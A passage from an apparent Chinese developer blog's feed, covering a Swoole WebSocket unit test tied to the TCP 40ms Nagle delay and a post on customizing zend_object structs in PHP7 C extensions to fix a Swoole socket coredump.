开发者希望它总是保持低延迟的, 而不是动不动就出来40ms, 若想要底层防止拥塞, 那么届时再手动开启<code>Nagle合并算法</code>.</p><p>  在我写完以上内容后, 我搜了一下, 发现这个问题有很多让我哭笑的标题:</p><ul><li><a href="https://blog.csdn.net/zheng0518/article/details/78561246" target="_blank" rel="noopener">神秘的40毫秒延迟与 TCP_NODELAY</a></li><li><a href="https://blog.csdn.net/historyasamirror/article/details/6122284" target="_blank" rel="noopener">写socket的“灵异事件”</a></li><li><p><a href="https://cloud.tencent.com/developer/article/1004431" target="_blank" rel="noopener">再说TCP神奇的40ms</a></p><p>好吧, 肯来很多前人都被这个神奇的40ms困扰过, 说明写个博客还是很能造福后人的.</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;  事情是这样的, 最近在做Swoole的Websocket的底层代码优化, 和编写更多的单元测试来保证代码正确和功能的稳定性, 写了很多高质量的”混沌”测试, 好吧, 其实并不是那么混沌, 只是这个词眼看起来很帅.&lt;br&gt;以往的unit tests更像是一些带着assert的examples, 加之phpt的测试风格, 顶多再来个EXPECT(F/REGEX)的预期输出对比, 只能测试出这个功能能否跑通, 并没有覆盖到功能的健壮性.而每当底层出现BUG接着我们很快就发现了原因时, 都会感叹单元测试不够全面和完善.&lt;br&gt;  所以在新写的测试中, 我尽量引入随机数据和一定量的并发压力来简单的模拟各种情况, 在自动化的单元测试中这样的做法已经是权衡了测试敏捷和健全的最优解了, 比如以下这个名为&lt;code&gt;websocket-fin&lt;/code&gt;的测试:&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$count = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$pm = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ProcessManager;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$pm-&amp;gt;parentFunc = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(int $pid)&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;($pm, &amp;amp;$count)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ($c = MAX_CONCURRENCY; $c--;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        go(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;($pm, &amp;amp;$count)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $cli = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; \Swoole\Coroutine\Http\Client(&lt;span class=&quot;string&quot;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;, $pm-&amp;gt;getFreePort());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $cli-&amp;gt;set([&lt;span class=&quot;string&quot;&gt;&#39;timeout&#39;&lt;/span&gt; =&amp;gt; &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $ret = $cli-&amp;gt;upgrade(&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            assert($ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $rand_list = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $times = MAX_REQUESTS;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ($n = $times; $n--;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $rand = openssl_random_pseudo_bytes(mt_rand(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1280&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $rand_list[] = $rand;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $opcode = $n === $times - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; ? WEBSOCKET_OPCODE_TEXT : WEBSOCKET_OPCODE_CONTINUATION;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $finish = $n === &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (mt_rand(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    $frame = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; swoole_websocket_frame;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    $frame-&amp;gt;opcode = $opcode;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    $frame-&amp;gt;data = $rand;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    $frame-&amp;gt;finish = $finish;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    $ret = $cli-&amp;gt;push($frame);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    $ret = $cli-&amp;gt;push($rand, $opcode, $finish);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                assert($ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $frame = $cli-&amp;gt;recv();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (assert($frame-&amp;gt;data === implode(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, $rand_list))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $count++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    swoole_event_wait();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    assert($count === MAX_CONCURRENCY);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $pm-&amp;gt;kill();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$pm-&amp;gt;childFunc = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;($pm)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $serv = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; swoole_websocket_server(&lt;span class=&quot;string&quot;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;, $pm-&amp;gt;getFreePort(), mt_rand(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) ? SWOOLE_BASE : SWOOLE_PROCESS);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $serv-&amp;gt;set([&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;log_file&#39;&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;/dev/null&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $serv-&amp;gt;on(&lt;span class=&quot;string&quot;&gt;&#39;WorkerStart&#39;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;($pm)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $pm-&amp;gt;wakeup();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $serv-&amp;gt;on(&lt;span class=&quot;string&quot;&gt;&#39;Message&#39;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(swoole_websocket_server $serv, swoole_websocket_frame $frame)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (mt_rand(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $serv-&amp;gt;push($frame-&amp;gt;fd, $frame);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $serv-&amp;gt;push($frame-&amp;gt;fd, $frame-&amp;gt;data, $frame-&amp;gt;opcode, &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $serv-&amp;gt;start();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$pm-&amp;gt;childFirst();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$pm-&amp;gt;run();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="swoole" scheme="http://www.twosee.cn/tags/swoole/"/>
    
      <category term="tcp&quot;" scheme="http://www.twosee.cn/tags/tcp/"/>
    
      <category term="nodelay" scheme="http://www.twosee.cn/tags/nodelay/"/>
    
      <category term="nagle" scheme="http://www.twosee.cn/tags/nagle/"/>
    
  </entry>
  
  <entry>
    <title>自定义zend_object的结构体的hack技巧</title>
    <link href="http://www.twosee.cn/2018/07/17/custom-zend-object-hack-way/"/>
    <id>http://www.twosee.cn/2018/07/17/custom-zend-object-hack-way/</id>
    <published>2018-07-16T16:08:00.000Z</published>
    <updated>2018-07-16T16:12:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>研究这个主要是为了解决<code>swoole-socket</code>模块的一个coredump的bug, 之前swoole采用了<code>swoole_get/set_object</code>等做法来存取对应的对象, 只有socket模块使用了魔改zend_object的方法, 但是PHP7里用了比较hack的结构体技巧, 导致了一系列问题, 想魔改zend_object, 需要一番操作, 中文文档很难找到用法的, 都是一笔带过, 需要去看英文文档.</p><p>虽然只有一次提交, 但其实改了不下几十遍, 在此记录一下:</p><blockquote><p>第一个参考文章: <a href="https://segmentfault.com/a/1190000004173452" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004173452</a></p></blockquote><p>Swoole在<code>socket coro</code>中使用了别的模块没有用到的自定义zend_object属性的技巧, 但是PHP7中它需要做额外的处理, 导致了一些问题.</p><h3 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h3><p>因为 <code>zend_object</code> 在存储属性表时用了结构体 hack 的技巧，<code>zend_object</code> 尾部存储的 PHP 属性会覆盖掉后续添加进去的内部成员。所以 PHP7 的实现中必须把自己添加的成员添加到标准对象结构的前面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct custom_object &#123;</span><br><span class="line">    uint32_t something;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">    zend_object std;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>不过这样也就意味着现在无法直接在 zend_object<em> 和 struct custom_object</em> 进行简单的转换了，因为两者都一个偏移分割开了。所以这个偏移量就需要被存储在对象 handler 表中的第一个元素中，这样在编译时通过 offsetof() 宏就能确定具体的偏移值</p><a id="more"></a><hr><p>但是现在仍不知道具体的操作方式, 只能去搜官网的英文文档等</p><p>官网有一篇从PHP5升级到PHPNG的文章中提到了这个坑</p><blockquote><p>ref: <a href="https://wiki.php.net/phpng-upgrading" target="_blank" rel="noopener">https://wiki.php.net/phpng-upgrading</a></p></blockquote><p>Custom Objects 一节:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">zend_object * <span class="title">custom_object_new</span><span class="params">(zend_class_entry *ce TSRMLS_DC)</span> </span>&#123;</span><br><span class="line">     # Allocate sizeof(custom) + sizeof(properties table requirements)</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">custom_object</span> *<span class="title">intern</span> = <span class="title">ecalloc</span>(1, </span></span><br><span class="line"><span class="class">         <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">custom_object</span>) + </span></span><br><span class="line"><span class="class">         <span class="title">zend_object_properties_size</span>(<span class="title">ce</span>));</span></span><br><span class="line">     # Allocating:</span><br><span class="line">     <span class="meta"># struct custom_object &#123;</span></span><br><span class="line">     <span class="meta">#    void *custom_data;</span></span><br><span class="line">     #    zend_object <span class="built_in">std</span>;</span><br><span class="line">     # &#125;</span><br><span class="line">     <span class="meta"># zval[ce-&gt;default_properties_count-1]</span></span><br><span class="line">     zend_object_std_init(&amp;intern-&gt;<span class="built_in">std</span>, ce TSRMLS_CC);</span><br><span class="line">     ...</span><br><span class="line">     custom_object_handlers.offset = XtOffsetOf(struct custom_obj, <span class="built_in">std</span>);</span><br><span class="line">     custom_object_handlers.free_obj = custom_free_storage;</span><br><span class="line"> </span><br><span class="line">     intern-&gt;<span class="built_in">std</span>.handlers = custom_object_handlers;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">return</span> &amp;intern-&gt;<span class="built_in">std</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的是swoole中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">swoole_socket_coro_class_entry_ptr-&gt;create_object = swoole_socket_coro_create;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> zend_object *<span class="title">swoole_socket_coro_create</span><span class="params">(zend_class_entry *ce TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    socket_coro *sock = ecalloc(<span class="number">1</span>, <span class="keyword">sizeof</span>(socket_coro) + zend_object_properties_size(ce));</span><br><span class="line">    <span class="comment">// 这里要给properties_size额外分配内存</span></span><br><span class="line">    zend_object_std_init(&amp;sock-&gt;<span class="built_in">std</span>, ce TSRMLS_CC);</span><br><span class="line">    object_properties_init(&amp;sock-&gt;<span class="built_in">std</span>, ce); <span class="comment">//这是坑2加的</span></span><br><span class="line">    sock-&gt;<span class="built_in">std</span>.handlers = &amp;swoole_socket_coro_handlers;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;sock-&gt;<span class="built_in">std</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们得做一个方法和一个<strong><code>Z_SOCKET_CORO_OBJ_P</code></strong>宏来从zval或zend_object获取socket_coro</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> socket_coro * <span class="title">sw_socket_coro_fetch_object</span><span class="params">(zend_object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (socket_coro *) ((<span class="keyword">char</span> *) obj - XtOffsetOf(socket_coro, <span class="built_in">std</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Z_SOCKET_CORO_OBJ_P(zv) sw_socket_coro_fetch_object(Z_OBJ_P(zv));</span></span><br></pre></td></tr></table></figure><p>在方法里这么用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket_coro *sock = (socket_coro *) Z_SOCKET_CORO_OBJ_P(getThis());</span><br></pre></td></tr></table></figure><h3 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h3><p>但是这里又踩了个坑…使用自定义的create_object之后…对象属性并不会自己初始化</p><p>我发现之前的swoole socket coro压根没有errCode属性…</p><p>在zend_object里没有相关API, 好不容易又找到另一篇文章, 找到了API…</p><blockquote><p>ref: <a href="http://www.phpinternalsbook.com/classes_objects/custom_object_storage.html" target="_blank" rel="noopener">http://www.phpinternalsbook.com/classes_objects/custom_object_storage.html</a></p></blockquote><p>在Overriding create_object一节…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object_properties_init(&amp;sock-&gt;<span class="built_in">std</span>, ce);</span><br></pre></td></tr></table></figure><h3 id="坑3"><a href="#坑3" class="headerlink" title="坑3"></a>坑3</h3><p>之前没用过socket组件, accept会返回一个socket coro对象, 以为修好了, server端又coredump了</p><p>因为: </p><p>在创建对象的时候，Zend并不会帮我们调用构造函数，需要我们自己显式的在object上调用__construct方法</p><p>或者做和__construct方法一样的事情</p><p>在onReadable事件里这样改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (conn &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    zend_object *client;</span><br><span class="line">    client = swoole_socket_coro_create(swoole_socket_coro_class_entry_ptr);</span><br><span class="line">    socket_coro *client_sock = (socket_coro *) sw_socket_coro_fetch_object(client);</span><br><span class="line">    ZVAL_OBJ(&amp;result, &amp;client_sock-&gt;<span class="built_in">std</span>);</span><br><span class="line">    client_sock-&gt;fd = conn;</span><br><span class="line">    client_sock-&gt;domain = sock-&gt;domain;</span><br><span class="line">    client_sock-&gt;object = result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;研究这个主要是为了解决&lt;code&gt;swoole-socket&lt;/code&gt;模块的一个coredump的bug, 之前swoole采用了&lt;code&gt;swoole_get/set_object&lt;/code&gt;等做法来存取对应的对象, 只有socket模块使用了魔改zend_object的方法, 但是PHP7里用了比较hack的结构体技巧, 导致了一系列问题, 想魔改zend_object, 需要一番操作, 中文文档很难找到用法的, 都是一笔带过, 需要去看英文文档.&lt;/p&gt;
&lt;p&gt;虽然只有一次提交, 但其实改了不下几十遍, 在此记录一下:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;第一个参考文章: &lt;a href=&quot;https://segmentfault.com/a/1190000004173452&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://segmentfault.com/a/1190000004173452&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Swoole在&lt;code&gt;socket coro&lt;/code&gt;中使用了别的模块没有用到的自定义zend_object属性的技巧, 但是PHP7中它需要做额外的处理, 导致了一些问题.&lt;/p&gt;
&lt;h3 id=&quot;坑1&quot;&gt;&lt;a href=&quot;#坑1&quot; class=&quot;headerlink&quot; title=&quot;坑1&quot;&gt;&lt;/a&gt;坑1&lt;/h3&gt;&lt;p&gt;因为 &lt;code&gt;zend_object&lt;/code&gt; 在存储属性表时用了结构体 hack 的技巧，&lt;code&gt;zend_object&lt;/code&gt; 尾部存储的 PHP 属性会覆盖掉后续添加进去的内部成员。所以 PHP7 的实现中必须把自己添加的成员添加到标准对象结构的前面：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;struct custom_object &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    uint32_t something;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#x2F;&amp;#x2F; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    zend_object std;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不过这样也就意味着现在无法直接在 zend_object&lt;em&gt; 和 struct custom_object&lt;/em&gt; 进行简单的转换了，因为两者都一个偏移分割开了。所以这个偏移量就需要被存储在对象 handler 表中的第一个元素中，这样在编译时通过 offsetof() 宏就能确定具体的偏移值&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
      <category term="zend" scheme="http://www.twosee.cn/tags/zend/"/>
    
  </entry>
  
  <entry>
    <title>在Swoole中实现MySQL存储过程</title>
    <link href="http://www.twosee.cn/2018/07/16/mysql-procedure-implementation-in-swoole/"/>
    <id>http://www.twosee.cn/2018/07/16/mysql-procedure-implementation-in-swoole/</id>
    <published>2018-07-16T15:59:58.000Z</published>
